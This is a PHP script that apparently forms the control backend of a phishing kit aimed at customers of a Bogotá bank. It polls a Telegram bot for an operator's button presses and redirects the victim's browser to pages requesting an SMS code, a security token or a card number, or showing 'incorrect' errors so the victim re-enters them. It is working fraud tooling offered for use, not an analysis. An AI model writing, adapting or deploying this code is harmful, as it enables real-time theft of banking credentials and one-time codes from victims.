<?php
if (session_status() !== PHP_SESSION_ACTIVE) { session_start(); }
set_time_limit(60);
ignore_user_abort(true);
require_once __DIR__ . '/../../config.php';

$BOT_TOKEN = BOT_TOKEN;

header('Content-Type: application/json');
header("Access-Control-Allow-Origin: *");

function getUpdates($botToken, $offset = 0) {
    $url  = "https://api.telegram.org/bot{$botToken}/getUpdates";
    $data = ['offset' => $offset, 'timeout' => 3, 'allowed_updates' => ['callback_query']];
    $ch   = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url . '?' . http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 8);
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ($httpCode == 200) ? json_decode($response, true) : null;
}

function answerCallbackQuery($botToken, $id, $text = '') {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot{$botToken}/answerCallbackQuery");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(['callback_query_id' => $id, 'text' => $text]));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 8);
    curl_exec($ch);
    curl_close($ch);
}

function editMessageReplyMarkup($botToken, $chatId, $messageId) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot{$botToken}/editMessageReplyMarkup");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'chat_id'      => $chatId,
        'message_id'   => $messageId,
        'reply_markup' => json_encode(['inline_keyboard' => []]),
    ]));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 8);
    curl_exec($ch);
    curl_close($ch);
}

function getRedirectUrl($action) {
    $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
    $base     = $protocol . '://' . $_SERVER['HTTP_HOST'] . dirname($_SERVER['REQUEST_URI']);

    switch ($action) {
        case 'action_sms_bogota':
            return $base . '/sms_bogota.php';

        case 'action_error_sms_bogota':
            return $base . '/error_sms_bogota.php';

        case 'action_token_bogota':
            return $base . '/token_bogota.php';

        case 'action_error_token_bogota':
            return $base . '/error_token_bogota.php';

        case 'action_pedir_cc_bogota':
        case 'action_tarjeta':
            return $base . '/tarjeta_bogota.php';

        case 'action_error_cc_bogota':
            return $base . '/tarjeta_bogota_error.php';

        case 'action_error_usuario_bogota':
        case 'action_error_usuario':
            return $base . '/error_usuario_bogota.php';

        case 'action_finalizar':
        case 'action_finalizado':
            return $base . '/finalizado.php';

        case 'action_otro_banco':
            return $base . '/finalizar.php';

        default:
            return $base . '/index.php';
    }
}

$textos = [
    'action_finalizar'            => '✅ Aprobado, finalizando...',
    'action_finalizado'           => '🏁 Proceso finalizado...',
    'action_sms_bogota'           => '📱 Redirigiendo a SMS...',
    'action_error_sms_bogota'     => '❌ SMS incorrecto...',
    'action_token_bogota'         => '🔑 Redirigiendo a token...',
    'action_error_token_bogota'   => '❌ Token incorrecto...',
    'action_pedir_cc_bogota'      => '💳 Redirigiendo a tarjeta...',
    'action_error_cc_bogota'      => '❌ Tarjeta incorrecta...',
    'action_error_usuario_bogota' => '❌ Usuario incorrecto...',
    'action_otro_banco'           => '🏦 Redirigiendo...',
];

$messageId = isset($_GET['msg_id']) ? preg_replace('/[^0-9]/', '', $_GET['msg_id']) : null;
if (!$messageId) { echo json_encode(['error' => 'message_id requerido']); exit; }

clearstatcache();
$fileName    = 'message_bogota_' . $messageId . '.json';
$messageFile = __DIR__ . '/' . $fileName;
if (!file_exists($messageFile)) {
    $temp = sys_get_temp_dir() . '/' . $fileName;
    if (file_exists($temp)) $messageFile = $temp;
    else { echo json_encode(['waiting' => true]); exit; }
}

$messageData = json_decode(file_get_contents($messageFile), true);

if (!empty($messageData['callback_processed'])) {
    echo json_encode([
        'redirect' => true,
        'action'   => $messageData['callback_action'] ?? '',
        'url'      => getRedirectUrl($messageData['callback_action'] ?? ''),
    ]);
    exit;
}

if ((time() - ($messageData['timestamp'] ?? time())) > 600) {
    $messageData['callback_timeout'] = true;
    file_put_contents($messageFile, json_encode($messageData));
    echo json_encode(['timeout' => true, 'message' => 'Tiempo de espera agotado']);
    exit;
}

$offset  = $messageData['last_update_id'] ?? 0;
$updates = getUpdates($BOT_TOKEN, $offset > 0 ? $offset + 1 : 0);

if ($updates && isset($updates['result']) && count($updates['result']) > 0) {
    foreach ($updates['result'] as $update) {
        $updateId = $update['update_id'];
        if (!isset($update['callback_query'])) {
            $messageData['last_update_id'] = $updateId;
            continue;
        }

        $callbackQuery   = $update['callback_query'];
        $callbackData    = $callbackQuery['data']                  ?? '';
        $callbackQueryId = $callbackQuery['id']                    ?? '';
        $msgId           = $callbackQuery['message']['message_id'] ?? 0;
        $messageData['last_update_id'] = $updateId;

        if ((string)$msgId !== (string)$messageId) {
            file_put_contents($messageFile, json_encode($messageData));
            continue;
        }

        $responseText = $textos[$callbackData] ?? '⚙️ Procesando...';
        answerCallbackQuery($BOT_TOKEN, $callbackQueryId, $responseText);
        editMessageReplyMarkup($BOT_TOKEN, $messageData['chat_id'], $messageId);

        $messageData['callback_processed'] = true;
        $messageData['callback_action']    = $callbackData;
        $messageData['processed_at']       = time();
        file_put_contents($messageFile, json_encode($messageData));

        echo json_encode(['redirect' => true, 'action' => $callbackData, 'url' => getRedirectUrl($callbackData)]);
        exit;
    }
    file_put_contents($messageFile, json_encode($messageData));
}

echo json_encode(['waiting' => true]);
exit;